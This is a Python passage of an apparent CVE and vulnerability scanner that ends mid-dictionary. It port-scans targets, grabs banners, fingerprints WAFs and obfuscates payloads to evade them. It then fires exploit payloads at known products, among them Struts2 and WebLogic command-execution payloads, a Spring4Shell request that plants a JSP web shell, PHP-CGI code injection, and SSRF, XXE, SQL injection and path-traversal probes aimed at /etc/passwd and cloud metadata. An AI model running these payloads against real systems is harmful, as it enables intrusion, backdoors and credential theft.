import base64
import http.cookiejar
import html as htmllib
import json
import os
import re
import socket
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from urllib.parse import quote, urljoin

TARGETS = ["192.168.1.1", "example.com", "https://staging.example.com", "10.0.0.5:8080"]
AUTO_PORT_SCAN = AUTO_BANNER_GRAB = AUTO_HTTP_FINGERPRINT = AUTO_PROBE = True
CUSTOM_PORTS = None
PORT_SCAN_TIMEOUT, PORT_SCAN_WORKERS = 0.5, 50
INSECURE = True
AUTH_HEADERS, BASIC_AUTH, COOKIE = {}, None, None
PROBE_RATE = PROBE_JITTER = 0.0
PROBE_WAF_BYPASS = False
OUTPUT_DIR = Path("./scan_output")
SAVE_JSON = SAVE_HTML = SAVE_LOG = True


class Log:
    def __init__(self, path=None):
        self.fh = None
        if path and SAVE_LOG:
            try:
                self.fh = open(path, "w", encoding="utf-8")
            except OSError:
                self.fh = None

    def __call__(self, m):
        print(m, flush=True)
        if self.fh:
            try:
                self.fh.write(m + "\n")
                self.fh.flush()
            except (OSError, ValueError):
                pass

    def close(self):
        if self.fh:
            try:
                self.fh.close()
            except (OSError, ValueError):
                pass
            self.fh = None


LOG = Log()


def info(m):
    LOG(f"  {m}")


def step(m):
    LOG(f"\n>>> {m}")


def warn(m):
    LOG(f"  \u26a0  {m}")


def err(m):
    LOG(f"  \u2717  {m}")


def tgt(m):
    LOG(f"\n{'=' * 88}\n  {m}\n{'=' * 88}")


ICONS = {
    "CRITICAL": "\U0001f534",
    "HIGH": "\U0001f7e0",
    "MEDIUM": "\U0001f7e1",
    "LOW": "\U0001f7e2",
    "INFO": "\u2139\ufe0f",
}


def finding(p, c, d):
    p_str = str(p) if p is not None else "UNKNOWN"
    c_str = str(c) if c is not None else "-"
    d_str = str(d) if d is not None else ""
    LOG(f"  {ICONS.get(p_str, '\u2022')} [{p_str:>8}] {c_str:<18} {d_str}")


def confirm(cve, method, ev):
    LOG(f"  \u2713 CONFIRMED  {cve}  ({method})")
    LOG(f"      evidence: {str(ev or '')[:200]}")


class Resp:
    __slots__ = (
        "status_code",
        "headers",
        "text",
        "content",
        "url",
        "elapsed_seconds",
    )

    def __init__(self, st, h, b, u, el):
        self.status_code = st
        self.headers = h
        self.url = u
        self.elapsed_seconds = el
        self.text = b.decode("utf-8", "replace") if isinstance(b, bytes) else (b or "")
        self.content = b if isinstance(b, bytes) else (b or "").encode()


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


def _opener(jar, follow):
    ctx = ssl.create_default_context()
    if INSECURE:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    hs = [
        urllib.request.HTTPCookieProcessor(jar),
        urllib.request.HTTPSHandler(context=ctx),
    ]
    if not follow:
        hs.append(_NoRedirect())
    return urllib.request.build_opener(*hs)


class Session:
    def __init__(self):
        self.jar = http.cookiejar.CookieJar()
        self.follow = _opener(self.jar, True)
        self.nofollow = _opener(self.jar, False)

    def request(
        self,
        method,
        url,
        params=None,
        data=None,
        json_body=None,
        headers=None,
        timeout=15,
        allow_redirects=False,
    ):
        if params:
            url += ("&" if "?" in url else "?") + urllib.parse.urlencode(params)
        h = dict(AUTH_HEADERS)
        h.update(headers or {})
        if COOKIE:
            h["Cookie"] = COOKIE
        body = None
        if json_body is not None:
            body = json.dumps(json_body).encode()
            h.setdefault("Content-Type", "application/json")
        elif data is not None:
            if isinstance(data, dict):
                body = urllib.parse.urlencode(data).encode()
            elif isinstance(data, str):
                body = data.encode()
            else:
                body = data
            h.setdefault("Content-Type", "application/x-www-form-urlencoded")
        if BASIC_AUTH:
            h["Authorization"] = "Basic " + base64.b64encode(
                f"{BASIC_AUTH[0]}:{BASIC_AUTH[1]}".encode()
            ).decode()
        h.setdefault("User-Agent", "cve-scanner/9.0")
        req = urllib.request.Request(url, data=body, headers=h, method=method.upper())
        op = self.follow if allow_redirects else self.nofollow
        t0 = time.monotonic()
        try:
            r = op.open(req, timeout=timeout)
            return Resp(
                r.status, dict(r.headers), r.read(), r.url, time.monotonic() - t0
            )
        except urllib.error.HTTPError as e:
            try:
                b = e.read()
            except Exception:
                b = b""
            return Resp(e.code, dict(e.headers or {}), b, url, time.monotonic() - t0)
        except Exception:
            return None

    def get(self, url, **k):
        return self.request("GET", url, **k)

    def post(self, url, **k):
        return self.request("POST", url, **k)


def get_json(url, params=None, headers=None, timeout=30):
    if params:
        url += ("&" if "?" in url else "?") + urllib.parse.urlencode(params)
    req = urllib.request.Request(
        url, headers={"User-Agent": "cve-scanner/9.0", **(headers or {})}
    )
    with urllib.request.urlopen(
        req, timeout=timeout, context=ssl.create_default_context()
    ) as r:
        return json.loads(r.read().decode())


def vtuple(v):
    if not v:
        return None
    n = re.findall(r"\d+", v)
    return tuple(map(int, n)) if n else None


def vrange(det, si, se, ei, ee):
    v = vtuple(det)
    if v is None:
        return False
    si, se, ei, ee = vtuple(si), vtuple(se), vtuple(ei), vtuple(ee)
    if si and v < si:
        return False
    if se and v <= se:
        return False
    if ei and v > ei:
        return False
    if ee and v >= ee:
        return False
    return True


CWE_NAMES = {
    "CWE-20": "Input Validation",
    "CWE-22": "Path Traversal",
    "CWE-78": "Command Injection",
    "CWE-79": "XSS",
    "CWE-89": "SQL Injection",
    "CWE-90": "LDAP Injection",
    "CWE-94": "SSTI",
    "CWE-95": "Eval Injection",
    "CWE-113": "CRLF Injection",
    "CWE-200": "Info Disclosure",
    "CWE-287": "Auth Bypass",
    "CWE-295": "Improper Cert",
    "CWE-306": "Missing Auth",
    "CWE-319": "Cleartext",
    "CWE-352": "CSRF",
    "CWE-400": "Resource Exhaustion",
    "CWE-434": "File Upload",
    "CWE-476": "NULL Deref",
    "CWE-502": "Insecure Deserialization",
    "CWE-601": "Open Redirect",
    "CWE-611": "XXE",
    "CWE-643": "XPath Injection",
    "CWE-732": "Wrong Permissions",
    "CWE-787": "OOB Write",
    "CWE-798": "Hardcoded Creds",
    "CWE-862": "Missing AuthZ",
    "CWE-863": "Incorrect AuthZ",
    "CWE-918": "SSRF",
    "CWE-943": "NoSQL Injection",
    "CWE-1021": "Clickjacking",
    "CWE-1104": "Unmaintained",
    "CWE-1321": "Prototype Pollution",
    "CWE-1333": "ReDoS",
}


def cwe_name(c):
    return CWE_NAMES.get(c, c or "Unknown")


CVE_PROBES = {
    "CVE-2021-41773": {
        "label": "Apache 2.4.49 Path Traversal",
        "probes": [
            {
                "path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
                "sig": {"passwd": r"root:[x*]?:0:0:"},
            }
        ],
    },
    "CVE-2021-42013": {
        "label": "Apache 2.4.50 Path Traversal",
        "probes": [
            {
                "path": "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
                "sig": {"passwd": r"root:[x*]?:0:0:"},
            }
        ],
    },
    "CVE-2019-19781": {
        "label": "Citrix ADC Path Traversal",
        "probes": [
            {"path": "/vpn/../vpns/cfg/smb.conf", "sig": {"smb": r"\[global\]"}}
        ],
    },
    "CVE-2019-11510": {
        "label": "Pulse Secure Path Traversal",
        "probes": [
            {
                "path": "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/",
                "sig": {"passwd": r"root:[x*]?:0:0:"},
            }
        ],
    },
    "CVE-2018-13379": {
        "label": "FortiOS SSL VPN Path Traversal",
        "probes": [
            {
                "path": "/remote/fgt_lang?lang=/../../../..///////////dev/cmdb/sslvpn_websession",
                "sig": {"fgt": r"var fgt_lang"},
            }
        ],
    },
    "CVE-2022-1388": {
        "label": "F5 BIG-IP Auth Bypass",
        "probes": [
            {
                "method": "POST",
                "path": "/mgmt/tm/util/bash",
                "headers": {
                    "X-F5-Auth-Token": "x",
                    "Connection": "X-F5-Auth-Token",
                    "Content-Type": "application/json",
                },
                "json_body": {"command": "run", "utilCmdArgs": "-c id"},
                "require_status": [200],
                "sig": {"f5": r"\"commandResult\"|\"kind\":\"tm:util:bash:runstate\""},
            }
        ],
    },
    "CVE-2020-14882": {
        "label": "WebLogic Auth Bypass",
        "probes": [
            {
                "path": "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread.currentThread().getContextClassLoader()')",
                "require_status": [200],
                "sig": {"weblogic": r"WebLogic|console\.portal|Oracle"},
            }
        ],
    },
    "CVE-2023-22515": {
        "label": "Confluence Broken Access Control",
        "probes": [
            {
                "path": "/setup/setupadministrator.action",
                "require_status": [200],
                "sig": {"setup": r"<title>Setup System Administrator"},
            }
        ],
    },
    "CVE-2024-1709": {
        "label": "ScreenConnect Auth Bypass",
        "probes": [
            {
                "path": "/SetupWizard.aspx/../../ScreenConnect/Login.aspx",
                "require_status": [200],
                "sig": {"sc": r"ScreenConnect|Login\.aspx"},
            }
        ],
    },
    "CVE-2023-27350": {
        "label": "PaperCut Auth Bypass",
        "probes": [
            {
                "path": "/app?service=page/SetupCompleted",
                "require_status": [200],
                "sig": {"pc": r"PaperCut|SetupCompleted"},
            }
        ],
    },
    "CVE-2021-40539": {
        "label": "ManageEngine Auth Bypass",
        "probes": [{"path": "/./", "sig": {"me": r"ManageEngine|ADSelfService"}}],
    },
    "CVE-2022-40684": {
        "label": "FortiOS Auth Bypass",
        "probes": [
            {
                "path": "/api/v2/cmdb/system/admin/root",
                "headers": {"Forwarded": 'for="[127.0.0.1]:80";by="[127.0.0.1]:80";'},
                "sig": {"fgt_admin": r"\"http_method\"|\"trusthost\"|\"accprofile\""},
            }
        ],
    },
    "CVE-2017-5638": {
        "label": "Struts2 S2-045 RCE",
        "probes": [
            {
                "method": "GET",
                "path": "/",
                "headers": {
                    "Content-Type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
                },
                "sig": {"uid": r"uid=\d+\([^)]*\)"},
            }
        ],
    },
    "CVE-2022-26134": {
        "label": "Confluence OGNL Injection",
        "probes": [
            {
                "path": "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.getInputStream%28%29%2C%22utf-8%22%29%29%7D%2F.%2F",
                "sig": {"c": r"Confluence|OGNL|X-CVE-PROBE"},
            }
        ],
    },
    "CVE-2021-26084": {
        "label": "Confluence Pre-Auth OGNL",
        "probes": [
            {
                "method": "POST",
                "path": "/pages/doenterpagevariables.action",
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "data": "queryString=%5Cu0027%2B%7BClass.forName%28%5Cu0027java.lang.Runtime%5Cu0027%29.getMethod%28%5Cu0027getRuntime%5Cu0027%2Cnull%29.invoke%28null%2Cnull%29.exec%28%5Cu0027id%5Cu0027%29%7D",
                "sig": {"c_err": r"Confluence|OGNL|XPathException"},
            }
        ],
    },
    "CVE-2023-34362": {
        "label": "MOVEit SQLi RCE",
        "probes": [
            {
                "path": "/human2.aspx",
                "sig": {"m": r"System\.Data\.SqlClient|SqlException|MOVEit"},
            }
        ],
    },
    "CVE-2018-7600": {
        "label": "Drupalgeddon2 RCE",
        "probes": [
            {
                "path": "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
                "sig": {"d": r"root:[x*]?:0:0:|uid=\d+"},
            }
        ],
    },
    "CVE-2022-22965": {
        "label": "Spring4Shell RCE",
        "probes": [
            {
                "method": "POST",
                "path": "/",
                "data": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(%25%7Bc2%7Di.getRuntime().exec(new%20String%5B%5D%7B%22%2Fbin%2Fsh%22%2C%22-c%22%2Crequest.getParameter(%22cmd%22)%7D).getInputStream())).readLine()%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
                "sig": {"spring": r"shell\.jsp|Spring"},
            }
        ],
    },
    "CVE-2024-21887": {
        "label": "Ivanti Command Injection",
        "probes": [
            {
                "path": "/api/v1/totp/user-backup-code/../../system/system-information",
                "sig": {"iv": r"Ivanti|Connect Secure|Pulse"},
            }
        ],
    },
    "CVE-2023-0669": {
        "label": "GoAnywhere Deserialization",
        "probes": [
            {"path": "/goanywhere/lic/accept", "sig": {"ga": r"GoAnywhere|lic/accept"}}
        ],
    },
    "CVE-2022-42475": {
        "label": "FortiOS SSL-VPN Overflow",
        "probes": [{"path": "/remote/error", "sig": {"f": r"FortiOS|SSL-VPN"}}],
    },
    "CVE-2022-47966": {
        "label": "ManageEngine SAML RCE",
        "probes": [
            {"path": "/SamlResponseServlet", "sig": {"me": r"ManageEngine|SAML"}}
        ],
    },
    "CVE-2020-5902": {
        "label": "F5 BIG-IP TMUI RCE",
        "probes": [
            {
                "path": "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/etc/passwd",
                "sig": {"f5": r"root:[x*]?:0:0:|admin|tmsh"},
            }
        ],
    },
    "CVE-2021-26855": {
        "label": "Exchange ProxyLogon",
        "probes": [
            {
                "path": "/ecp/x.jsx",
                "headers": {
                    "Cookie": "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt"
                },
                "sig": {"pl": r"Negotiate|X-BEResource|X-CalculatedBETarget"},
            }
        ],
    },
    "CVE-2021-34473": {
        "label": "Exchange ProxyShell",
        "probes": [
            {
                "path": "/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com&Protocol=XYZ&Mailbox=autodiscover/autodiscover.json%3F@test.com",
                "sig": {"ps": r"X-FEServer|X-BackEndCookie|autodiscover"},
            }
        ],
    },
    "CVE-2021-21972": {
        "label": "vCenter vROPs RCE",
        "probes": [
            {
                "method": "POST",
                "path": "/ui/vropspluginui/rest/services/uploadova",
                "headers": {"Content-Type": "application/octet-stream"},
                "data": "BOUNDARY",
                "sig": {"v": r"vropspluginui|uploadova|vROPs"},
            }
        ],
    },
    "CVE-2021-21985": {
        "label": "vCenter vSAN RCE",
        "probes": [
            {
                "path": "/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVrUsageDisabled/setTarget/",
                "sig": {"vs": r"vsanProviderUtils|h5-vsan"},
            }
        ],
    },
    "CVE-2024-3400": {
        "label": "PAN-OS GlobalProtect Cmd Injection",
        "probes": [
            {
                "path": "/global-protect/login.esp",
                "headers": {
                    "Cookie": "SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/cve-2024-3400.txt"
                },
                "sig": {"po": r"GlobalProtect|PanOS|Palo Alto"},
            }
        ],
    },
    "CVE-2019-2725": {
        "label": "WebLogic wls-wsat Deserialization",
        "probes": [
            {
                "method": "POST",
                "path": "/wls-wsat/CoordinatorPortType",
                "headers": {"Content-Type": "text/xml"},
                "data": '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="1"><void index="0"><string>/bin/id</string></void></array><void method="start"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>',
                "sig": {"wl": r"wls-wsat|WebLogic|X-CVE-PROBE"},
            }
        ],
    },
    "CVE-2016-4437": {
        "label": "Shiro rememberMe Deserialization",
        "probes": [
            {
                "path": "/",
                "headers": {
                    "Cookie": "rememberMe=rO0ABXNyAA1qYXZhLnV0aWwuTWFwASJV+1PjCyYCAAB4cHcIAAAAATAAc3IADGphdmEubGFuZy5Mb25n7Xpr+KiN7SgCAAB4cgAQamF2YS5sYW5nLk51bWJlcoVr66C8Z6HqAgABTAAKdmFsdWVMb25ndAAPTGphdmEvbGFuZy9Mb25nO3hwdAAIAAAAAAAAAAE="
                },
                "sig": {"sh": r"rememberMe|Shiro|deleteMe|X-CVE-PROBE"},
            }
        ],
    },
    "CVE-2023-4966": {
        "label": "Citrix Bleed",
        "probes": [
            {
                "path": "/oauth/idp/.well-known/openid-configuration",
                "headers": {"Host": "a" * 24576 + ".example.com"},
                "require_status": [200],
                "sig": {"cb": r"ctx\.session|citrix_session|NSC_[A-Za-z0-9]{20,}"},
            }
        ],
    },
    "CVE-2024-4577": {
        "label": "PHP CGI Argument Injection",
        "probes": [
            {
                "path": "/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "data": "<?php echo 'CVE-2024-4577-MARKER'; ?>",
                "sig": {"p": r"CVE-2024-4577-MARKER"},
            }
        ],
    },
}

SQL_SIGS = [
    (
        "mysql",
        r"SQL syntax.*MySQL|MySqlException|com\.mysql\.jdbc|MariaDB server version",
    ),
    ("postgresql", r"PostgreSQL.*ERROR|PSQLException|syntax error at or near"),
    ("oracle", r"ORA-\d{5}|oracle\.jdbc"),
    (
        "mssql",
        r"Microsoft.*ODBC.*SQL Server|SqlException|System\.Data\.SqlClient|Incorrect syntax near",
    ),
    ("sqlite", r"SQLite\.Exception|\[SQLITE_ERROR\]"),
]
RCE_SIGS = [
    ("uid_gid", r"uid=\d+\([^)]*\)\s+gid=\d+\([^)]*\)"),
    ("www_data", r"www-data:"),
    ("root_shell", r"root@[a-zA-Z0-9_-]+:"),
]
XSS_SIGS = {
    "raw_script": r"(?i)<script[^>]*>.*?</script>",
    "svg_onload": r"(?i)<svg[^>]+onload\s*=",
    "img_onerror": r"(?i)<img[^>]+onerror\s*=",
    "javascript_uri": r"(?i)javascript\s*:\s*[^\s\"']",
}
SSTI_SIGS = {
    "jinja": r"jinja2\.exceptions\.",
    "twig": r"Twig\\Error\\",
    "freemarker": r"freemarker\.core\.ParseException",
    "e49": r"(?<![\d])49(?![\d])",
    "e79m": r"(?<![\d])79005424(?![\d])",
}
REDIR_SIGS = {
    "evil": r"(?m)^Location\s*:\s*https?://[^/\s]*evil",
    "protorel": r"(?m)^Location\s*:\s*//evil",
}

CWE_PROBES = {
    "CWE-79": {
        "label": "XSS (reflected)",
        "detect": "xss_reflection",
        "markers": ["XSSMARK1", "XSSMARK2", "XSSMARK3"],
        "payloads": [
            '<svg/onload=alert("XSSMARK1")>',
            '"><script>alert("XSSMARK2")</script>',
            "'><img src=x onerror=alert('XSSMARK3')>",
        ],
    },
    "CWE-89": {
        "label": "SQL Injection",
        "detect": "sql",
        "timing_threshold": 3.0,
        "payloads": ["' OR SLEEP(4)-- -", "' AND SLEEP(4)-- -", "'", '"'],
    },
    "CWE-22": {
        "label": "Path Traversal",
        "detect": "pattern",
        "payloads": [
            "../../../../../../etc/passwd",
            "....//....//....//....//etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
        ],
        "signatures": {"passwd": r"root:[x*]?:0:0:", "win_ini": r"\[fonts\]"},
    },
    "CWE-78": {
        "label": "Command Injection",
        "detect": "rce",
        "timing_threshold": 3.0,
        "payloads": [";sleep 4;", "|id", "|sleep 4", "$(sleep 4)"],
    },
    "CWE-94": {
        "label": "SSTI",
        "detect": "ssti",
        "expected": "79005424",
        "payloads": ["{{8888*8888}}", "${8888*8888}", "<%= 8888*8888 %>", "{{7*7}}"],
    },
    "CWE-918": {
        "label": "SSRF",
        "detect": "pattern",
        "payloads": [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:80/",
            "file:///etc/passwd",
        ],
        "signatures": {
            "aws_imds": r"ami-id|instance-id",
            "gcp": r"metadata\.google\.internal",
            "file_proto": r"root:[x*]?:0:0:",
        },
    },
    "CWE-611": {
        "label": "XXE",
        "detect": "pattern",
        "payloads": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        ],
        "signatures": {"passwd": r"root:[x*]?:0:0:", "libxml": r"libxml2"},
    },
    "CWE-502": {
        "label": "Insecure Deserialization",
        "detect": "pattern",
        "payloads": ['O:8:"stdClass":1:{s:4:"test";s:4:"pwn3";}'],
        "signatures": {
            "java_magic": r"rO0AB",
            "php_ser": r"O:\d+:\"",
            "pickle": r"_pickle\.UnpicklingError",
        },
    },
    "CWE-601": {
        "label": "Open Redirect",
        "detect": "redirect",
        "expected": "evil.example.com",
        "payloads": [
            "https://evil.example.com/",
            "//evil.example.com/",
            "/\\evil.example.com/",
        ],
    },
    "CWE-943": {
        "label": "NoSQL Injection",
        "detect": "pattern",
        "payloads": ['{"$ne": ""}', '{"$gt": ""}', "' || '1'=='1"],
        "signatures": {
            "mongo": r"MongoError|MongoServerError",
            "operator": r"\$ne|\$gt|\$where",
        },
    },
    "CWE-90": {
        "label": "LDAP Injection",
        "detect": "pattern",
        "payloads": ["*)(uid=*))(|(uid=*", "admin)(&(password=*))"],
        "signatures": {"ldap": r"LDAPException|ldap_search|Invalid DN syntax"},
    },
    "CWE-643": {
        "label": "XPath Injection",
        "detect": "pattern",
        "payloads": ["' or '1'='1", "x' or name()='username' or 'x'='y"],
        "signatures": {"xpath": r"XPathException|XPath syntax error"},
    },
    "CWE-113": {
        "label": "CRLF Injection",
        "detect": "pattern",
        "payloads": ["%0d%0aX-Injected:%20true", "\r\nX-Injected: true"],
        "signatures": {"crlf": r"(?m)^X-Injected:\s*"},
    },
    "CWE-1321": {
        "label": "Prototype Pollution",
        "detect": "pattern",
        "payloads": ['{"__proto__": {"polluted": "yes"}}'],
        "signatures": {"polluted": r"polluted"},
    },
}

WAF_FP = {
    "cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "server:cloudflare"],
        "body": ["attention required! | cloudflare", "ray id:"],
        "status": [403, 503],
    },
    "akamai": {
        "headers": ["server:akamaighost"],
        "body": ["access denied | akamai"],
        "status": [403],
    },
    "imperva": {
        "headers": ["x-iinfo"],
        "body": ["incapsula incident id"],
        "status": [403],
    },
    "f5_big_ip_asm": {
        "headers": ["x-wa-info"],
        "body": ["the requested url was rejected"],
        "status": [403],
    },
    "aws_waf": {
        "headers": ["x-amzn-requestid"],
        "body": ["request blocked by aws waf"],
        "status": [403],
    },
    "fortiweb": {
        "headers": ["server:fortiweb"],
        "body": ["fortiweb"],
        "status": [403],
    },
    "sucuri": {
        "headers": ["x-sucuri-id"],
        "body": ["sucuri website firewall"],
        "status": [403],
    },
    "modsecurity": {
        "headers": ["server:modsecurity"],
        "body": ["mod_security"],
        "status": [403, 406],
    },
}


def sig_match(text, sigs, baseline=None):
    hits = []
    items = sigs.items() if isinstance(sigs, dict) else sigs
    for label, pat in items:
        try:
            if re.search(pat, text or "", re.I) and not (
                baseline and re.search(pat, baseline or "", re.I)
            ):
                hits.append(label)
        except re.error:
            pass
    return hits


def resp_blob(r):
    if r is None:
        return ""
    hdrs = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
    return hdrs + "\n\n" + (r.text or "")


def detect_waf(status, headers, body):
    h = {k.lower(): str(v).lower() for k, v in headers.items()}
    b = (body or "").lower()
    for vendor, fp in WAF_FP.items():
        ev = []
        for hh in fp.get("headers", []):
            if ":" in hh:
                k, v = hh.split(":", 1)
                if h.get(k.strip()) and v.strip() in h[k.strip()]:
                    ev.append(f"header:{hh}")
            elif hh in h:
                ev.append(f"header:{hh}")
        ev += [f"body:{p}" for p in fp.get("body", []) if p in b]
        if status in fp.get("status", []) and ev:
            ev.append(f"status:{status}")
        if ev:
            return {"vendor": vendor, "evidence": ev}
    return None


def obfuscate(p):
    vs = [p]
    for kw in ("SELECT", "UNION", "SLEEP", "AND", "OR", "WHERE"):
        if kw in p.upper():
            vs.append(p.replace(kw, kw.lower()))
    vs += [p.replace(" ", "/**/"), p.replace(" ", "%20"), quote(quote(p, safe=""))]
    return list(dict.fromkeys(vs))


def is_blocked(r):
    if r is None:
        return False
    if r.status_code in (403, 406, 429, 503):
        return True
    b = (r.text or "").lower()
    return any(
        p in b
        for p in (
            "blocked by",
            "access denied",
            "request rejected",
            "firewall",
            "captcha",
            "challenge",
        )
    )


COMMON_PORTS = {
    22: "SSH",
    23: "Telnet",
    3389: "RDP",
    21: "FTP",
    445: "SMB",
    25: "SMTP",
    110: "POP3",
    143: "IMAP",
    587: "SMTP-Sub",
    993: "IMAPS",
    389: "LDAP",
    636: "LDAPS",
    53: "DNS",
    80: "HTTP",
    443: "HTTPS",
    8000: "HTTP-Alt",
    8008: "HTTP-Alt",
    8080: "HTTP-Proxy",
    8081: "HTTP-Alt",
    8443: "HTTPS-Alt",
    8888: "HTTP-Alt",
    9000: "HTTP-Alt",
    9090: "HTTP-Alt",
    1433: "MSSQL",
    1521: "Oracle",
    3306: "MySQL",
    5432: "PostgreSQL",
    5984: "CouchDB",
    6379: "Redis",
    27017: "MongoDB",
    9200: "Elasticsearch",
    2375: "Docker",
    6443: "K8s-API",
}
SSL_PORTS = {443, 636, 993, 995, 8443, 2376}


def normalize_target(v):
    v = v.strip().rstrip("/")
    if not v:
        return []
    if v.startswith(("http://", "https://")):
        return [v]
    if v.startswith("["):
        e = v.find("]")
        if e == -1:
            return [f"https://[{v}]", f"http://[{v}]"]
        host, rest = v[: e + 1], v[e + 1 :]
        return [f"https://{host}{rest}", f"http://{host}{rest}"]
    if v.count(":") > 1:
        return [f"https://[{v}]", f"http://[{v}]"]
    if ":" in v:
        h, _, p = v.partition(":")
        return [f"https://{h}:{p}", f"http://{h}:{p}"]
    return [f"https://{v}", f"http://{v}"]


def extract_host(t):
    if "://" in t:
        return urllib.parse.urlparse(t).hostname or t
    if t.startswith("["):
        e = t.find("]")
        return t[1:e] if e != -1 else t[1:]
    if t.count(":") > 1:
        return t
    return t.split(":")[0] if t.count(":") == 1 else t


def _family(host):
    try:
        socket.inet_pton(socket.AF_INET6, host)
        return socket.AF_INET6
    except OSError:
        return socket.AF_INET


def port_scan(host, ports, timeout=0.5, workers=50):
    fam = _family(host)

    def check(p):
        try:
            s = socket.socket(fam, socket.SOCK_STREAM)
            s.settimeout(timeout)
            ok = s.connect_ex((host, p)) == 0
            s.close()
            return p, ok
        except Exception:
            return p, False

    out = {}
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = [ex.submit(check, p) for p in ports]
        for f in as_completed(futs):
            p, ok = f.result()
            if ok:
                out[p] = ports[p]
    return out


def banner_grab(host, port, timeout=3.0, use_ssl=False):
    fam = _family(host)
    try:
        s = socket.socket(fam, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        b = b""
        if port in (21, 22, 25, 110, 143, 587, 993, 995, 3306):
            try:
                b = s.recv(1024)
            except socket.timeout:
                pass
        elif port == 6379:
            s.sendall(b"PING\r\n")
            try:
                b = s.recv(1024)
            except socket.timeout:
                pass
        elif port in (389, 636):
            s.sendall(b"\x30\x0c\x02\x01\x01\x60\x07\x02\x01\x03\x04\x00\x80\x00")
            try:
                b = s.recv(1024)
            except socket.timeout:
                pass
        elif port in (
            80,
            443,
            8000,
            8008,
            8080,
            8081,
            8443,
            8888,
            9000,
            9090,
            9200,
            2375,
            2376,
            6443,
        ):
            path = "/version" if port in (2375, 2376) else "/"
            s.sendall(
                f"GET {path} HTTP/1.0\r\nHost: {host}\r\nUser-Agent: cve-scanner/9.0\r\n\r\n".encode()
            )
            chunks = []
            while True:
                try:
                    c = s.recv(4096)
                    if not c:
                        break
                    chunks.append(c)
                    if sum(len(x) for x in chunks) > 65536:
                        break
                except socket.timeout:
                    break
            b = b"".join(chunks)
        s.close()
        return b.decode("utf-8", "replace")[:8192] if b else None
    except Exception:
        return None


def auto_banner(host, port, timeout=3.0):
    use_ssl = port in SSL_PORTS
    return banner_grab(host, port, timeout, use_ssl) or banner_grab(
        host, port, timeout, not use_ssl
    )


def detect_working_url(cands, sess, timeout=10):
    for url in cands:
        r = sess.get(url, timeout=timeout, allow_redirects=True)
        if r is not None:
            return (url, r.status_code)
    return None


TECH_SIGS = {
    "Apache HTTP Server": {
        "vendor": "apache",
        "product": "http_server",
        "header": (r"Server:\s*Apache/([\d.]+)", 1),
    },
    "nginx": {
        "vendor": "nginx",
        "product": "nginx",
        "header": (r"Server:\s*nginx/([\d.]+)", 1),
    },
    "Microsoft IIS": {
        "vendor": "microsoft",
        "product": "internet_information_services",
        "header": (r"Server:\s*Microsoft-IIS/([\d.]+)", 1),
    },
    "PHP": {
        "vendor": "php",
        "product": "php",
        "header": (r"X-Powered-By:\s*PHP/([\d.]+)", 1),
    },
    "ASP.NET": {
        "vendor": "microsoft",
        "product": "asp.net",
        "header": (r"X-AspNet-Version:\s*([\d.]+)", 1),
    },
    "jQuery": {
        "vendor": "jquery",
        "product": "jquery",
